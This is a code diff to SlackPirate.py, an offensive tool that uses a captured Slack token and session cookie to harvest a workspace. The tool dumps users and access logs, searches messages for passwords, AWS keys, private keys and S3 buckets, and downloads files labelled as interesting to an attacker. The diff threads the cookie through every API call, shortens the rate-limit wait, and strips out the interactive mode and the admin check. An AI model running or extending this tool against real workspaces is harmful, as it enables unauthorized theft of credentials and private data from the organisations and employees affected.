@@ -152,7 +152,7 @@ def sleep_if_rate_limited(slack_api_json_response):
 
     if slack_api_json_response['ok'] is False and slack_api_json_response['error'] == 'ratelimited':
         print(termcolor.colored("[Rate-limit]: Slack API rate limit hit - sleeping for 60 seconds", "yellow"))
-        time.sleep(60)
+        time.sleep(10)
         return True
     else:
         return False
@@ -182,9 +182,6 @@ def list_cookie_tokens(cookie, user_agent):
         print(termcolor.colored(exception, "red"))
     
     return workspaces
-
-
-def display_cookie_tokens(cookie, user_agent):
     """
     If the --cookie flag is set then the tool connect to a Slack Workspace that you won't be a member of (like mine)
     then RegEx out the Workspaces you're logged in to. It will then connect to each one of those Workspaces then
@@ -206,7 +203,7 @@ def display_cookie_tokens(cookie, user_agent):
     exit()
 
 
-def init_scanning_context(token, user_agent: str) -> ScanningContext:
+def init_scanning_context(token, cookie, user_agent: str) -> ScanningContext:
     """
     Initialize the Scanning Context which is used for all the scans.
     """
@@ -214,7 +211,7 @@ def init_scanning_context(token, user_agent: str) -> ScanningContext:
     result = None
     try:
         r = requests.post("https://slack.com/api/auth.test", params=dict(pretty=1),
-                          headers={'Authorization': 'Bearer ' + token, 'User-Agent': user_agent}).json()
+                          headers={'Authorization': 'Bearer ' + token, 'Cookie': f'd={cookie}', 'User-Agent': user_agent}).json()
         if str(r['ok']) == 'True':
             result = ScanningContext(output_directory=str(r['team']) + '_' + time.strftime("%Y%m%d-%H%M%S"),
                                      slack_workspace=str(r['url']), user_agent=user_agent, user_id=str(r['user_id']), username=str(r['user']))
@@ -226,14 +223,14 @@ def init_scanning_context(token, user_agent: str) -> ScanningContext:
     return result
 
 
-def check_if_admin_token(token, scan_context: ScanningContext):
+def check_if_admin_token(token, cookie, scan_context: ScanningContext):
     """
     Checks to see if the token provided is an admin, owner, or primary_owner.
     """
 
     try:
         r = requests.get("https://slack.com/api/users.info", params=dict(
-            token=token, pretty=1, user=scan_context.user_id), headers={'User-Agent': scan_context.user_agent}).json()
+            token=token, pretty=1, user=scan_context.user_id), headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
         return r['user']['is_admin'] or r['user']['is_owner'] or r['user']['is_primary_owner']
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(str(exception), "red"))
@@ -256,7 +253,7 @@ def print_interesting_information(scan_context: ScanningContext):
         print(termcolor.colored(str(exception), "red"))
 
 
-def dump_team_access_logs(token, scan_context: ScanningContext):
+def dump_team_access_logs(token, cookie, scan_context: ScanningContext):
     """
     You need the token of an elevated user (lucky you!) and the Workspace must be a paid one - i.e., not a free one
     The information here can be useful but I wouldn't fret about it - the other data is far more interesting
@@ -267,7 +264,7 @@ def dump_team_access_logs(token, scan_context: ScanningContext):
     try:
         r = requests.get("https://slack.com/api/team.accessLogs",
                          params=dict(token=token, pretty=1, count=MAX_RETRIEVAL_COUNT),
-                         headers={'User-Agent': scan_context.user_agent}).json()
+                         headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
         sleep_if_rate_limited(r)
         if str(r['ok']) == 'True':
             for value in r['logins']:
@@ -288,7 +285,7 @@ def dump_team_access_logs(token, scan_context: ScanningContext):
     print(termcolor.colored("\n"))
 
 
-def dump_user_list(token, scan_context: ScanningContext):
+def dump_user_list(token, cookie, scan_context: ScanningContext):
     """
     In case you're wondering (hello fellow nerd/future me), the reason for limit=900 is because what Slack says:
     `To begin pagination, specify a limit value under 1000. We recommend no more than 200 results at a time.`
@@ -305,7 +302,7 @@ def dump_user_list(token, scan_context: ScanningContext):
         while True:
             r = requests.get("https://slack.com/api/users.list",
                          params=dict(token=token, pretty=1, limit=1, cursor=pagination_cursor),
-                         headers={'User-Agent': scan_context.user_agent}).json()
+                         headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
             if not sleep_if_rate_limited(r):
                 break
         if str(r['ok']) == 'False':
@@ -316,7 +313,7 @@ def dump_user_list(token, scan_context: ScanningContext):
             while str(r['ok']) == 'True' and pagination_cursor:
                 request_url = "https://slack.com/api/users.list"
                 params = dict(token=token, pretty=1, limit=MAX_RETRIEVAL_COUNT, cursor=pagination_cursor)
-                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
+                r = requests.get(request_url, params=params, headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
                 for value in r['members']:
                     pagination_cursor = r['response_metadata']['next_cursor']
                     results.append(value)
@@ -330,7 +327,7 @@ def dump_user_list(token, scan_context: ScanningContext):
     print(termcolor.colored("\n"))
 
 
-def find_s3(token, scan_context: ScanningContext):
+def find_s3(token, cookie, scan_context: ScanningContext):
     print(termcolor.colored("[S3]: Attempting to find references to S3 buckets", "blue"))
     page_count_by_query = dict()
 
@@ -340,7 +337,7 @@ def find_s3(token, scan_context: ScanningContext):
             while True:
                 r = requests.get("https://slack.com/api/search.messages",
                                  params=dict(token=token, query="\"{}\"".format(query), pretty=1, count=100),
-                                 headers={'User-Agent': scan_context.user_agent}).json()
+                                 headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
                 if not sleep_if_rate_limited(r):
                     break
             page_count_by_query[query] = (r['messages']['pagination']['page_count'])
@@ -357,7 +354,7 @@ def find_s3(token, scan_context: ScanningContext):
                 params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100, page=str(page))
                 r = requests.get("https://slack.com/api/search.messages",
                                  params=params,
-                                 headers={'User-Agent': scan_context.user_agent}).json()
+                                 headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
                 regex_results = re.findall(S3_REGEX, str(r))
                 if verbose:
                     write_to_csv(r, S3_REGEX, FILE_S3, scan_context)
@@ -376,7 +373,7 @@ def find_s3(token, scan_context: ScanningContext):
     print(termcolor.colored("\n"))
 
 
-def find_credentials(token, scan_context: ScanningContext):
+def find_credentials(token, cookie, scan_context: ScanningContext):
     print(termcolor.colored("[Credentials]: Attempting to find references to credentials", "blue"))
     page_count_by_query = dict()
 
@@ -387,7 +384,7 @@ def find_credentials(token, scan_context: ScanningContext):
                 params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100)
                 r = requests.get("https://slack.com/api/search.messages",
                                  params=params,
-                                 headers={'User-Agent': scan_context.user_agent}).json()
+                                 headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
                 if not sleep_if_rate_limited(r):
                     break
             page_count_by_query[query] = (r['messages']['pagination']['page_count'])
@@ -403,7 +400,7 @@ def find_credentials(token, scan_context: ScanningContext):
                 sleep_if_rate_limited(r)
                 request_url = "https://slack.com/api/search.messages"
                 params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100, page=str(page))
-                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
+                r = requests.get(request_url, params=params, headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
                 regex_results = re.findall(CREDENTIALS_REGEX, str(r))
                 if verbose:
                     write_to_csv(r, CREDENTIALS_REGEX, FILE_CREDENTIALS, scan_context)
@@ -421,7 +418,7 @@ def find_credentials(token, scan_context: ScanningContext):
     print(termcolor.colored("\n"))
 
 
-def find_aws_keys(token, scan_context: ScanningContext):
+def find_aws_keys(token, cookie, scan_context: ScanningContext):
     print(termcolor.colored("[AWS IAM Keys]: Attempting to find references to AWS keys", "blue"))
     page_count_by_query = {}
 
@@ -432,7 +429,7 @@ def find_aws_keys(token, scan_context: ScanningContext):
                 params = dict(token=token, query=query, pretty=1, count=100)
                 r = requests.get("https://slack.com/api/search.messages",
                              params=params,
-                             headers={'User-Agent': scan_context.user_agent}).json()
+                             headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
                 if not sleep_if_rate_limited(r):
                     break
             page_count_by_query[query] = (r['messages']['pagination']['page_count'])
@@ -448,7 +445,7 @@ def find_aws_keys(token, scan_context: ScanningContext):
                 sleep_if_rate_limited(r)
                 request_url = "https://slack.com/api/search.messages"
                 params = dict(token=token, query=query, pretty=1, count=100, page=str(page))
-                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
+                r = requests.get(request_url, params=params, headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
                 regex_results = re.findall(AWS_KEYS_REGEX, str(r))
                 if verbose:
                     write_to_csv(r, AWS_KEYS_REGEX, FILE_AWS_KEYS, scan_context)
@@ -466,7 +463,7 @@ def find_aws_keys(token, scan_context: ScanningContext):
     print(termcolor.colored("\n"))
 
 
-def find_private_keys(token, scan_context: ScanningContext):
+def find_private_keys(token, cookie, scan_context: ScanningContext):
     """
     Searching for private keys by using certain keywords. Slack returns the actual string '\n' in the response so
     we're replacing the string with an actual \n new line :-)
@@ -482,7 +479,7 @@ def find_private_keys(token, scan_context: ScanningContext):
                 params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100)
                 r = requests.get("https://slack.com/api/search.messages",
                              params=params,
-                             headers={'User-Agent': scan_context.user_agent}).json()
+                             headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
                 if not sleep_if_rate_limited(r):
                     break
             page_count_by_query[query] = (r['messages']['pagination']['page_count'])
@@ -498,7 +495,7 @@ def find_private_keys(token, scan_context: ScanningContext):
                 sleep_if_rate_limited(r)
                 request_url = "https://slack.com/api/search.messages"
                 params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100, page=str(page))
-                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
+                r = requests.get(request_url, params=params, headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
                 regex_results = re.findall(PRIVATE_KEYS_REGEX, str(r))
                 remove_new_line_char = [w.replace('\\n', '\n') for w in regex_results]
                 if verbose:
@@ -517,7 +514,7 @@ def find_private_keys(token, scan_context: ScanningContext):
     print(termcolor.colored("\n"))
 
 
-def find_all_channels(token, scan_context: ScanningContext):
+def find_all_channels(token, cookie, scan_context: ScanningContext):
     """
     Return a dictionary of the names and ids of all Slack channels that the token has access to.
     This includes public and private channels.
@@ -531,7 +528,7 @@ def find_all_channels(token, scan_context: ScanningContext):
                              params=dict(token=token,
                                          pretty=1, limit=1, cursor=pagination_cursor,
                                          types='public_channel,private_channel'),
-                             headers={'User-Agent': scan_context.user_agent}).json()
+                             headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
             if not sleep_if_rate_limited(r):
                 pagination_cursor = r['response_metadata']['next_cursor']
                 break
@@ -540,7 +537,7 @@ def find_all_channels(token, scan_context: ScanningContext):
                              params=dict(token=token,
                                          pretty=1, limit=MAX_RETRIEVAL_COUNT, cursor=pagination_cursor,
                                          types='public_channel,private_channel'),
-                             headers={'User-Agent': scan_context.user_agent}).json()
+                             headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
             pagination_cursor = r['response_metadata']['next_cursor']
             for channel in r['channels']:
                 # Add the channel name as the key and id as the value in the dictionary.
@@ -574,7 +571,7 @@ def _write_messages(file_path: str, contents: List[str]):
                 out.write(text_content)
 
 
-def find_pinned_messages(token, scan_context: ScanningContext):
+def find_pinned_messages(token, cookie, scan_context: ScanningContext):
     """
     This function looks for pinned messages across all Slack channels the token has access to - including private
     channels. We often find interesting information in pinned messages.
@@ -583,12 +580,12 @@ def find_pinned_messages(token, scan_context: ScanningContext):
     """
 
     print(termcolor.colored("[Pinned Messages]: Attempting to find references to pinned messages", "blue"))
-    channel_list = find_all_channels(token, scan_context)
+    channel_list = find_all_channels(token, cookie, scan_context)
     output_file = "{}/{}".format(scan_context.output_directory, FILE_PINNED_MESSAGES)
 
     total_pinned_messages = 0
     pinned_message_contents = []
-    request_header = {'User-Agent': scan_context.user_agent}
+    request_header = {'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}
 
     try:
         for channel_name, channel_id in channel_list.items():
@@ -620,7 +617,7 @@ def find_pinned_messages(token, scan_context: ScanningContext):
     print(termcolor.colored("\n"))
 
 
-def find_interesting_links(token, scan_context: ScanningContext):
+def find_interesting_links(token, cookie, scan_context: ScanningContext):
     """
     Does a search for URI/URLs by searching for keywords such as 'amazonaws', 'jenkins', etc.
     We're using the special Slack search 'has:link' here.
@@ -635,7 +632,7 @@ def find_interesting_links(token, scan_context: ScanningContext):
             while True:
                 request_url = "https://slack.com/api/search.messages"
                 params = dict(token=token, query="has:link {}".format(query), pretty=1, count=100)
-                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
+                r = requests.get(request_url, params=params, headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
                 if not sleep_if_rate_limited(r):
                     break
             page_count_by_query[query] = (r['messages']['pagination']['page_count'])
@@ -651,7 +648,7 @@ def find_interesting_links(token, scan_context: ScanningContext):
                 sleep_if_rate_limited(r)
                 request_url = "https://slack.com/api/search.messages"
                 params = dict(token=token, query="has:link {}".format(query), pretty=1, count=100, page=str(page))
-                r = requests.get(request_url, params=params, headers={'User-Agent': scan_context.user_agent}).json()
+                r = requests.get(request_url, params=params, headers={'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}).json()
                 regex_results = re.findall(LINKS_REGEX, str(r))
                 if verbose:
                     write_to_csv(r, LINKS_REGEX, FILE_LINKS, scan_context)
@@ -683,10 +680,11 @@ def _retrieve_file_batch(file_requests: List[Process], completed_file_names: Que
         requests_incomplete = any(request for request in file_requests if request.is_alive())
 
 
-def _download_file(url: str, output_filename: str, token: str, user_agent: str, download_directory: str, q: Queue):
+def _download_file(url: str, output_filename: str, token: str, cookie: str, user_agent: str, download_directory: str, q: Queue):
     """Private helper to retrieve and write a file from a URL"""
     try:
-        headers = {'Authorization': 'Bearer ' + token, 'User-Agent': user_agent}
+        print(url)
+        headers = {'Authorization': 'Bearer ' + token, 'Cookie': f'd={cookie}', 'User-Agent': user_agent}
         response = requests.get(url, headers=headers)
 
         output_file = open("{}/{}".format(download_directory, output_filename), 'wb')
@@ -700,7 +698,7 @@ def _download_file(url: str, output_filename: str, token: str, user_agent: str, 
         q.put(termcolor.colored(error_msg, "red"))
 
 
-def download_interesting_files(token, scan_context: ScanningContext):
+def download_interesting_files(token, cookie, scan_context: ScanningContext):
     """
     Downloads files which may be interesting to an attacker. Searches for certain keywords then downloads.
     """
@@ -717,9 +715,9 @@ def download_interesting_files(token, scan_context: ScanningContext):
     # strips out characters which, though accepted in Slack, aren't accepted in Windows
     bad_chars_re = re.compile('[/:*?"<>|\\\]')  # Windows doesn't like "/ \ : * ? < > " or |
     page_counts_by_query = dict()  # Accumulates the number of pages of results for each query
-    common_file_dl_params = (token, scan_context.user_agent, download_directory, completed_file_names)
+    common_file_dl_params = (token, cookie, scan_context.user_agent, download_directory, completed_file_names)
     try:
-        query_header = {'User-Agent': scan_context.user_agent}
+        query_header = {'Cookie': f'd={cookie}', 'User-Agent': scan_context.user_agent}
         for query in INTERESTING_FILE_QUERIES:
             while True:
                 request_url = "https://slack.com/api/search.files"
@@ -733,7 +731,7 @@ def download_interesting_files(token, scan_context: ScanningContext):
             page = 1
             while page <= page_count:
                 request_url = "https://slack.com/api/search.files"
-                params = dict(token=token, query="\"{}\"".format(query), pretty=1, count=100, page=str(page))
+                params = dict(token=token, cookie=cookie, query="\"{}\"".format(query), pretty=1, count=100, page=str(page))
                 response_json = requests.get(request_url, params=params, headers=query_header).json()
                 if not sleep_if_rate_limited(response_json):
                     new_files = [new_file for new_file in response_json['files']['matches'] if
@@ -789,152 +787,6 @@ def file_cleanup(input_file, scan_context: ScanningContext):
         return
 
 
-def _choose_tokens(cookie, user_agent):
-    """
-    Find the list of workspaces for which a cookie has access and list them to use user to choose from. Used by the
-    interactive command line and return the users list of choices.
-    """
-
-    print(termcolor.colored("[INFO]: Scanning for Workspaces using the cookie provided - this may take a while...\n", "blue"))
-    tokens = list_cookie_tokens(dict(d=cookie), user_agent)
-    if tokens:
-        for i, (workspace, _, admin) in enumerate(tokens):
-            if admin:
-                print(termcolor.colored("[" + str(i) + "] " + workspace + " (admin!)", "magenta"))
-            else:
-                print(termcolor.colored("[" + str(i) + "] " + workspace + " (not admin)", "green"))
-    else:
-        print(termcolor.colored("[ERROR]: No Workspaces were found with this cookie", "red"))
-        return None
-
-    tokens = {str(k): v for k, v in enumerate(tokens)}
-
-    selection_list = input("\n>> Select the Workspace(s) to continue. Comma separated values accepted: ").strip()
-
-    selected_tokens = []
-    if selection_list:
-        selected = [s.strip() for s in selection_list.split(",")]
-        for s in selected:
-            if s in tokens:
-                selected_tokens.append(tokens[s][1])
-            else:
-                print(termcolor.colored("[ERROR]: Invalid workspace choice: '" + s + "'", "red"))
-                return None
-        print()
-    else:
-        print(termcolor.colored("[ERROR]: No tokens selected", "red"))
-
-    return selected_tokens
-
-
-def _choose_scans():
-    """
-    Lists the possible scanning options to the user and allows them to choose which should be run. Used by the
-    interactive command line and returns the list of chosen scans.
-    """
-
-    # Possible scans to run along with their names
-    scan_options = {
-        "A": ("Dump All",
-              [dump_team_access_logs, dump_user_list, find_s3, find_credentials, find_aws_keys, find_private_keys,
-               find_pinned_messages, find_interesting_links, download_interesting_files]),
-        "0": ('Dump team access logs in .json format if the token provided is a privileged token', [dump_team_access_logs]),
-        "1": ('Dump the user list in .json format', [dump_user_list]),
-        "2": ('Find references to S3 buckets', [find_s3]),
-        "3": ('Find references to passwords and other credentials', [find_credentials]),
-        "4": ('Find references to AWS keys', [find_aws_keys]),
-        "5": ('Find references to private keys', [find_private_keys]),
-        "6": ('Find references to pinned messages across all Slack channels', [find_pinned_messages]),
-        "7": ('Find references to interesting URLs and links', [find_interesting_links]),
-        "8": ('Download files based on pre-defined keywords', [download_interesting_files]),
-    }
-
-    # Print options to terminal
-    # print(termcolor.colored("The following scanning options are available:\n", "blue"))
-    for key, (name, _) in scan_options.items():
-        print(termcolor.colored("[" + key + "] " + name, "blue"))
-
-    # Select scanning options
-    selection_list = input("\n>> Select your scan option(s). Comma separated values accepted: ").strip()
-
-    if not selection_list:
-        print(termcolor.colored("[ERROR]: No scanning option selected", "red"))
-        return []
-
-    selection_list = selection_list.split(",")
-    selection_list = [s.strip() for s in selection_list]
-
-    if "A" in selection_list and len(selection_list) > 1:
-        print(termcolor.colored("[ERROR]: Cannot provide 'A' with other options", "red"))
-        return None
-
-    selected_scans = []
-    for s in selection_list:
-        if s in scan_options.keys():
-            selected_scans.extend(scan_options[s][1])
-        else:
-            print(termcolor.colored("[ERROR]: Invalid scan option provided: '" + s + "'", "red"))
-            return None
-
-    return selected_scans
-
-
-def _interactive_command_line(args, user_agent):
-    """
-    Runs the interactive command line interface.
-    """
-
-    # Check no flags provided (if you want to use flags don't use interactive mode)
-    args_as_dict = vars(args).copy()
-    del args_as_dict['cookie']
-    del args_as_dict['token']
-    del args_as_dict['verbose']
-    del args_as_dict['interactive']
-
-    no_flags_specified = all(value is None for value in args_as_dict.values())
-
-    if not no_flags_specified:
-        print(termcolor.colored("[ERROR]: You cannot use scan flags in interactive mode", "red"))
-        return
-
-    # Get cookie and token inputs
-    if args.cookie and args.token:
-        print(termcolor.colored("[ERROR]: You cannot use both --cookie and --token flags at the same time", "red"))
-        return
-    elif args.cookie:  # Providing a cookie leads to a shorter execution path
-        provided_tokens = _choose_tokens(args.cookie, user_agent)
-    elif args.token:
-        provided_tokens = [args.token]
-    else:
-        cookie_or_token = input("Cookie: Go to Slack.com and copy the value for the cookie called 'd' (you must be signed in to at least one Workspace)"
-                                                  "\nToken: Slack tokens start with 'XOX'"
-                                                  "\n\n>> Please provide a cookie or token: ").strip()
-        if re.fullmatch(SLACK_API_TOKEN_REGEX, cookie_or_token):
-            provided_tokens = [cookie_or_token]
-        else:
-            provided_tokens = _choose_tokens(cookie_or_token, user_agent)
-
-    if not provided_tokens:
-        return
-
-    selected_scans = _choose_scans()
-
-    if not selected_scans:
-        return
-
-    global verbose
-    verbose = args.verbose
-
-    for provided_token in provided_tokens:
-        collected_scan_context = init_scanning_context(token=provided_token, user_agent=selected_agent)
-
-        print(termcolor.colored("[Workspace Scan]: Scanning " + collected_scan_context.slack_workspace + "\n", "magenta"))
-
-        pathlib.Path(collected_scan_context.output_directory).mkdir(parents=True, exist_ok=True)
-        print_interesting_information(scan_context=collected_scan_context)
-
-        for scan in selected_scans:
-            scan(token=provided_token, scan_context=collected_scan_context)
 
 
 if __name__ == '__main__':
@@ -951,8 +803,6 @@ if __name__ == '__main__':
                         help='Slack Workspace token. The token should start with XOX.')
     parser.add_argument('-v', '--verbose', action="store_true",
                         help='Turn on verbosity for the output files')
-    parser.add_argument('--interactive', dest='interactive', action='store_true',
-                        help='enables the interactive command line for usability')
     parser.add_argument('--team-access-logs', dest='team_access_logs', action='store_true',
                         help='enable retrieval of team access logs')
     parser.add_argument('--no-team-access-logs', dest='team_access_logs', action='store_false',
@@ -1002,29 +852,24 @@ if __name__ == '__main__':
 
     selected_agent = get_user_agent()
 
-    if args.interactive:
-        _interactive_command_line(args, selected_agent)
-        exit()
-
     if args.cookie is None and args.token is None:  # Must provide one or the other
         print(termcolor.colored("[ERROR]: No arguments passed. Run SlackPirate.py --help ", "red"))
         exit()
-    elif args.cookie and args.token:  # May not provide both
-        print(termcolor.colored("[ERROR]: You cannot use both --cookie and --token flags at the same time", "red"))
-        exit()
-    elif args.cookie:  # Providing a cookie leads to a shorter execution path
-        display_cookie_tokens(cookie=dict(d=args.cookie), user_agent=selected_agent)
+    elif not (args.cookie and args.token):  # Providing a cookie leads to a shorter execution path
+        print(termcolor.colored("[ERROR]: You must provide both a token and a cookie. Run SlackPirate.py --help ", "red"))
         exit()
     # Baseline behavior
     provided_token = args.token
-    collected_scan_context = init_scanning_context(token=provided_token, user_agent=selected_agent)
+    provided_cookie = args.cookie
+    collected_scan_context = init_scanning_context(token=provided_token, cookie=provided_cookie, user_agent=selected_agent)
     pathlib.Path(collected_scan_context.output_directory).mkdir(parents=True, exist_ok=True)
     print(termcolor.colored("\n[INFO]: Token looks valid! URL: " + collected_scan_context.slack_workspace
                             + " User: " + collected_scan_context.username, "blue"))
     print(termcolor.colored("\n"))
-    if check_if_admin_token(token=provided_token, scan_context=collected_scan_context):
-        print(termcolor.colored("[BINGO]: You seem to be in possession of an admin token!", "magenta"))
-        print(termcolor.colored("\n"))
+    # Commented out admin check because it was hanging for some reason
+    # if check_if_admin_token(token=provided_token, cookie=provided_cookie,  scan_context=collected_scan_context):
+    #     print(termcolor.colored("[BINGO]: You seem to be in possession of an admin token!", "magenta"))
+    #     print(termcolor.colored("\n"))
     print_interesting_information(scan_context=collected_scan_context)
 
     # Possible scans to run along with their flags
@@ -1046,7 +891,6 @@ if __name__ == '__main__':
     del args_as_dict['cookie']
     del args_as_dict['token']
     del args_as_dict['verbose']
-    del args_as_dict['interactive']
 
     # no flags were specified - we run all scans
     no_flags_specified = all(value == None for value in args_as_dict.values())
@@ -1055,7 +899,7 @@ if __name__ == '__main__':
 
     if no_flags_specified:
         for flag, scan in flags_and_scans:
-            scan(token=provided_token, scan_context=collected_scan_context)
+            scan(token=provided_token, cookie=provided_cookie, scan_context=collected_scan_context)
         exit()
     elif any_true and any_false:  # There were both True and False arguments
         print(
@@ -1064,8 +908,8 @@ if __name__ == '__main__':
     elif any_true:  # There were only enable flags specified
         for flag, scan in flags_and_scans:
             if args_as_dict.get(flag, None):  # if flag is True, then run the scan
-                scan(token=provided_token, scan_context=collected_scan_context)
+                scan(token=provided_token, cookie=provided_cookie,  scan_context=collected_scan_context)
     else:  # anyFalse - There were only disable flags specified
         for flag, scan in flags_and_scans:
             if not args_as_dict.get(flag, None) == False:  # if flag is not False (None), then run the scan
-                scan(token=provided_token, scan_context=collected_scan_context)
+                scan(token=provided_token, cookie=provided_cookie,  scan_context=collected_scan_context)
